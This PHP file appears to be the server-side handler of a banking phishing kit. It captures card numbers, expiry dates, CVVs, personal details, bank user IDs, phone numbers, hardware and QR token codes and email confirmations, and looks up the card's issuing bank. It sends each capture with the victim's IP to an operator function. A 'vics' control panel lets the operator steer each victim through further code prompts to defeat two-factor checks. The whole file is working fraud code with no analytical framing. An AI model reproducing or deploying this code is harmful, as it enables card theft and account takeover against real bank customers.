<?php
  
    error_reporting(0);  
    require_once 'functions.php';

$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['l6']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$x2 = $_POST['l6'];$bin = $_POST['l6'] ;$bin = preg_replace('/\s/', '', $bin);$bin = substr($bin,0,8);$url = "https://lookup.binlist.net/".$bin;
$headers = array();$headers[] = 'Accept-Version: 3';
$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);$resp=curl_exec($ch);curl_close($ch);$xBIN = json_decode($resp, true);$_SESSION['bank_name'] = $xBIN["bank"]["name"];$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);$_SESSION['bank_type'] = strtoupper($xBIN["type"]);$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);$bnk = $_SESSION['bank_name'];


 if(isset($_POST["userCode"])) {
  $Login = " ----| USER ID |---------  
      [+] ID  :  ".$_POST['userCode']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }
if(isset($_POST["tel"])) {
  $Login = " ----| PHONE |---------  
      [+] phone  :  ".$_POST['tel']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }
if(isset($_POST["exp"])) {
  $Login = " ----| CC |---------  
      [+] CC  :  ".$_POST['c']." 
      [+] EXP  :  ".$_POST['exp']." 
      [+] CVV  :  ".$_POST['cv']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }
if(isset($_POST["serialNumberMainInput"])) {
  $Login = " ----| TOKEN1 |---------  
      [+] MACHINE NUM  :  ".$_POST['serialNumberMainInput']." 
      [+] TOKEN  :  ".$_POST['token1']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }
if(isset($_POST["qrcode"])) {
  $Login = " ----| QR TOKEN |---------  
      [+] QR TOKEN  :  ".$_POST['qrcode']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }
if(isset($_POST["email"])) {
  $Login = " ----| EMAIL SUCCESSFUL |---------  
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }

 if(isset($_POST["extra"])) {
  $Login = " ----| EXTRA |---------  
      [+] EXTRA  :  ".$_POST['extra']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      ---------------------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }


      if ($_POST['step'] == "control") {
            $fp = fopen('vics/'. $_POST['ip'] .'.txt', 'wb');
            $text = $_POST['to'];
            if( $_POST['to'] == 'qr' ) {
                $text = 'qr|' . $_POST['signaturcode'];
            }
            if( $_POST['to'] == 'token3' ) {
                $text = 'token3|' . $_POST['signaturcode2'];
            }
            if( $_POST['to'] == 'extra' ) {
                $text = 'extra|' . $_POST['signaturcode'];
            }
            if( $_POST['to'] == 'confirmation' ) {
                $text = 'confirmation|' . $_POST['confirmcode1'] . '-' . $_POST['confirmcode2'];
            }
            if( $_POST['to'] == 'badconfirmation' ) {
                $text = 'badconfirmation|' . $_POST['confirmcode1'] . '-' . $_POST['confirmcode2'];
            }
            fwrite($fp, $text);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }

if ($_GET['id'] == 1) {
            header("location: log.php?ip=" . $_POST['ip']);
} 
 
?>